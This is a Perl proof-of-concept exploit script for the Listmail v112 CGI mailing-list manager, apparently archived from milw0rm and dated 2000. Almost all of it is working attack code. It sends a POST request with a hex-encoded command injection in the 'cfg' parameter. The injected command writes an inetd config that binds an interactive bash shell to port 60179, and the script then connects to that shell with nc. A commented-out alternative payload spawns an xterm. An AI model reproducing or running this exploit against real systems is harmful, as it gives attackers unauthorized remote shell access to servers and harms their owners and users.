#!/usr/bin/perl -w

## Listmail v112 by P.M.Systems / PoC Exploit
##
## Listmail is a powerful, hands-free mailing
## list manager which is exploitable due to an
## insecure open call. This exploit will attempt
## to bind a shell at port 60179/fido by using
## inetd. Code to spawn an xterm is as always 
## included.
##
## http://teleh0r.cjb.net/ || teleh0r@doglover.com

use strict; use Socket;

if (@ARGV < 1) {
    print("Usage: $0 <target>\n");
    exit(1);
}

my($target,$length,$cgicode,$agent,$sploit, 
   $iaddr,$paddr,$proto);

$target = $ARGV[0];

print("\nRemote host: $target\n");
print("CGI-script: /cgi-bin/lmail.pl\n");

$agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)";

# echo 'fido stream tcp nowait nobody /bin/bash bash -i' > /tmp/.hass;
# /usr/sbin/inetd /tmp/.hass

$cgicode =

"\x63\x66\x67\x3d\x7c\x65\x63\x68\x6f\x2b\x27\x66\x69".
"\x64\x6f\x2b\x73\x74\x72\x65\x61\x6d\x2b\x74\x63\x70".
"\x2b\x6e\x6f\x77\x61\x69\x74\x2b\x6e\x6f\x62\x6f\x64".
"\x79\x2b\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x2b\x62".
"\x61\x73\x68\x2b\x2d\x69\x27\x2b\x3e\x2b\x2f\x74\x6d".
"\x70\x2f\x2e\x68\x61\x73\x73\x3b\x2f\x75\x73\x72\x2f".
"\x73\x62\x69\x6e\x2f\x69\x6e\x65\x74\x64\x2b\x2f\x74".
"\x6d\x70\x2f\x2e\x68\x61\x73\x73\x7c";

# Code to spawn an xterm - exploit would have to be modfied.
# cfg=%7Cxterm+-ut+-display+localhost%3A0%7C

$sploit =
"POST /cgi-bin/lmail.pl HTTP/1.0
Connection: close
User-Agent: $agent
Host: $target
Content-type: application/x-www-form-urlencoded
Content-length: 130

$cgicode";

$iaddr = inet_aton($target)                     || die("Error: $!\n");
$paddr = sockaddr_in(80, $iaddr)                || die("Error: $!\n");
$proto = getprotobyname('tcp')                  || die("Error: $!\n");

socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    || die("Error: $!\n");
connect(SOCKET, $paddr)                         || die("Error: $!\n");
send(SOCKET,"$sploit\015\012", 0)               || die("Error: $!\n");
close(SOCKET);

print("\nSleeping 5 seconds - waiting for the shell ...\n\n");
sleep(5); system("nc -w 10 $target 60179"); exit(0);


# milw0rm.com [2000-11-17]
